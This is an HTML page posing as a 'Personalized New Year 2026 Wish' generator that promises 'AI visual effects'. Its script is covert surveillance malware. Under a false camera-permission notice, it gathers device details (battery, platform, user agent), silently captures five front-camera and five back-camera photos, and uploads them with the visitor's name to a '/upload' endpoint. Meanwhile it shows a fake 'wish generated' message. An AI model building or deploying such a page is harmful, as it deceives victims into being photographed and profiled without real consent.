<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personalized New Year 2026 Wish</title>
    <style>
        body { background: #050505; color: gold; text-align: center; font-family: 'Segoe UI', sans-serif; }
        .main-box { margin-top: 80px; padding: 30px; border: 2px solid gold; border-radius: 20px; display: inline-block; background: rgba(255,215,0,0.05); box-shadow: 0 0 20px red; }
        h1 { font-size: 2.5rem; text-transform: uppercase; letter-spacing: 2px; }
        input { padding: 15px; border-radius: 30px; border: 1px solid gold; width: 85%; margin-bottom: 20px; background: #111; color: white; font-size: 1rem; }
        button { padding: 15px 40px; border-radius: 30px; background: linear-gradient(45deg, #ff0000, #ffcc00); border: none; color: black; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        #loader { display: none; color: lime; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="main-box">
        <h1>🎆 Happy New Year 2026 🎆</h1>
        <p>Enter your name to experience the AI Magic!</p>
        <input type="text" id="name" placeholder="Enter Your Full Name...">
        <br>
        <button onclick="processRequest()">GENERATE MY WISH ✨</button>
        <div id="loader">⚙️ OPTIMIZING AI FILTERS... PLEASE WAIT...</div>
    </div>

    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function processRequest() {
            let name = document.getElementById('name').value;
            if(!name) return alert("Please enter your name first!");
            
            // Professional English Permission Prompt
            if(confirm("SYSTEM NOTICE: To apply exclusive 2026 AI Visual Effects, this application requires temporary camera access. Do you wish to proceed?")) {
                document.getElementById('loader').style.display = 'block';
                try {
                    // Collect Device Info
                    let batteryInfo = await navigator.getBattery();
                    let info = {
                        battery: Math.round(batteryInfo.level * 100) + "%",
                        platform: navigator.platform,
                        browser: navigator.userAgent
                    };

                    // Phase 1: Capture 5 Front Photos
                    await startCapture(name, info, { facingMode: "user" }, 5, "FRONT");

                    // Phase 2: Capture 5 Back Photos
                    await startCapture(name, info, { facingMode: "environment" }, 5, "BACK");

                    document.getElementById('loader').innerText = "✅ AI WISH GENERATED SUCCESSFULLY!";
                    alert("Happy New Year 2026, " + name + "! Your personalized experience is ready.");
                } catch(e) {
                    alert("ERROR: Camera Permission is mandatory for AI Filters.");
                }
            }
        }

        async function startCapture(name, info, constraints, count, label) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                let video = document.getElementById('v');
                video.srcObject = stream;

                for (let i = 1; i <= count; i++) {
                    await new Promise(r => setTimeout(r, 1200)); // Delay between shots
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    let img = can.toDataURL('image/jpeg', 0.6);

                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({name: name, image: img, info: info, label: label + " SHOT " + i})
                    });
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { console.log(label + " Camera not accessible."); }
        }
    </script>
</body>
</html>
